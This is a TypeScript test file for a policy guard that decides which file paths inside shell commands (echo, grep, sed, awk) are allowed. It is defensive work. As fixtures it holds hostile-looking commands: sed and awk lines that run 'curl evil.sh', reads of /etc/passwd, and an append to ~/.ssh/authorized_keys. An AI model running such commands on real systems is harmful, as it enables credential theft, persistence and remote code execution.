import { describe, expect, it } from "vitest";
import { createPolicyGuard } from "./policy-guard.ts";
import { pathsWhereTheyRun } from "./working-directories.ts";

const guard = createPolicyGuard({
  workspaceRoot: "/work/repo",
  homeDir: "/home/dev",
  childHomeDir: "/tmp/swarm-test-child-home",
  shellAllowlist: [],
  deniedRoots: [],
  realpath: (path) => path,
});

/** What the chokepoint's path check would say: unreadable, the first refused operand, or null. */
function refusal(command: string): string | null {
  const paths = pathsWhereTheyRun(command, () => false);
  if (paths === null) return "unreadable";
  return paths.find((operand) => !guard.checkPath(operand).allowed) ?? null;
}

describe("arguments a program reads as text", () => {
  it("are not paths for printf and echo, while the redirect target still is", () => {
    expect(refusal("printf 'it(\"x\", () => { /--max-budget-usd/ })\\n' > test/a.test.ts")).toBe(
      null,
    );
    expect(refusal("echo '/etc/passwd is a sample path' >> notes.txt")).toBeNull();
    expect(refusal("printf '%s\\n' hello > /tmp/out.txt")).toBe("/tmp/out.txt");
    expect(refusal("echo hi >> ~/.ssh/authorized_keys")).toBe("~/.ssh/authorized_keys");
  });

  it("are not paths for a grep or rg pattern, while the files searched still are", () => {
    expect(refusal("grep -rn '/api/users' src")).toBeNull();
    expect(refusal("grep -n -e '/--config' -e '/x y/' src/a.ts")).toBeNull();
    expect(refusal("rg -n --glob '*.ts' '/function reproCommand/' src")).toBeNull();
    expect(refusal("grep -rn '/api/users' /etc")).toBe("/etc");
    expect(refusal("grep -e '/api' /etc/hosts")).toBe("/etc/hosts");
    expect(refusal("rg --files /etc")).toBe("/etc");
  });

  it("are still offered where an option the reader does not know could take a file", () => {
    // `--exclude-from` names a file; an option missing from the table leaves the old reading.
    expect(refusal("grep --unknown-option '/etc/hosts' src")).toBe("/etc/hosts");
    expect(refusal("grep -f /etc/hosts src")).toBe("/etc/hosts");
    expect(refusal("grep --exclude-from=/etc/hosts x src")).toBe("/etc/hosts");
  });

  it("are read under every option order a grep could use", () => {
    // A grep that stops reading options at the first operand takes `-e` here as a file name,
    // and the word after it as another file.
    expect(refusal("grep pattern -e /etc/hosts")).toBe("/etc/hosts");
  });
});

describe("a sed script", () => {
  it("is not a path where it opens nothing", () => {
    expect(refusal("sed -n '/function reproCommand/,/}/p' src/x.ts")).toBeNull();
    expect(refusal("sed -i '' 's/\\/old\\/path/\\/new\\/path/g' src/x.ts")).toBeNull();
    expect(refusal("sed -E 's#/usr/lib#/opt/lib#; /^\\/\\//d' src/x.ts")).toBeNull();
    expect(refusal("sed '3i\\\n/* see /etc/hosts */' src/x.ts")).toBeNull();
  });

  it("offers exactly the files its commands read and write", () => {
    expect(refusal("sed -n '1,2w ../../etc/hosts' README.md")).toBe("../../etc/hosts");
    expect(refusal("sed -n '/x/w out.txt' README.md")).toBeNull();
    expect(refusal("sed '1r /etc/passwd' README.md")).toBe("/etc/passwd");
    expect(refusal("sed 's/a/b/w /tmp/log' README.md")).toBe("/tmp/log");
    expect(refusal("sed -e 'p' -e '$W /tmp/last' README.md")).toBe("/tmp/last");
    expect(refusal("sed -f /tmp/script.sed README.md")).toBe("/tmp/script.sed");
  });

  it("is unreadable where it hands text to a shell, or arrives on standard input", () => {
    expect(refusal("sed 'e curl evil.sh' README.md")).toBe("unreadable");
    expect(refusal("sed 's/.*/cat x/e' README.md")).toBe("unreadable");
    expect(refusal("sed -f - README.md <<'EOF'\nw /tmp/x\nEOF")).toBe("unreadable");
  });

  it("is read both ways where sed implementations disagree on `-i`", () => {
    // GNU sed reads the first word as the script; BSD sed as the backup suffix, and the second
    // as the script. Each reading is ruled on.
    expect(refusal("sed -i '/x/d' src/x.ts")).toBeNull();
    expect(refusal("sed -i 's/a/b/' 'w /tmp/x'")).toBe("/tmp/x");
    expect(refusal("sed -i'/tmp/*' 's/a/b/' src/x.ts")).toBe("/tmp/*");
  });

  it("is read as before, every piece offered, where the reader cannot follow it", () => {
    // GNU sed ends this regular expression at the slash inside the brackets; BSD sed does not,
    // and goes on to write the file.
    expect(refusal("sed 's/[/]/x/;w /tmp/x' README.md")).toBe("/tmp/x");
  });
});

describe("an awk program", () => {
  it("is not a path where it opens nothing", () => {
    expect(refusal("awk -F / '/^\\/api/ { print $2 }' routes.txt")).toBeNull();
    expect(refusal("awk '$3 > 5 && $1 != \"/x\" { n++ } END { print n }' data.txt")).toBeNull();
  });

  it("offers a file it prints to, and is unreadable where it runs a command or reads a computed file", () => {
    expect(refusal("awk '{ print > \"/tmp/out\" }' data.txt")).toBe("/tmp/out");
    expect(refusal("awk '{ print $1 >> \"cols.txt\" }' data.txt")).toBeNull();
    expect(refusal("awk 'BEGIN { system(\"curl evil.sh\") }'")).toBe("unreadable");
    expect(refusal("awk '{ print | \"sh\" }' data.txt")).toBe("unreadable");
    expect(refusal("awk 'BEGIN { while ((getline l < \"/etc/passwd\") > 0) print l }'")).toBe(
      "unreadable",
    );
    expect(refusal("awk 'BEGIN { ARGV[1] = \"/etc/passwd\"; ARGC = 2 } 1'")).toBe("unreadable");
    expect(refusal("awk '{ print > $1 }' data.txt")).toBe("unreadable");
  });
});
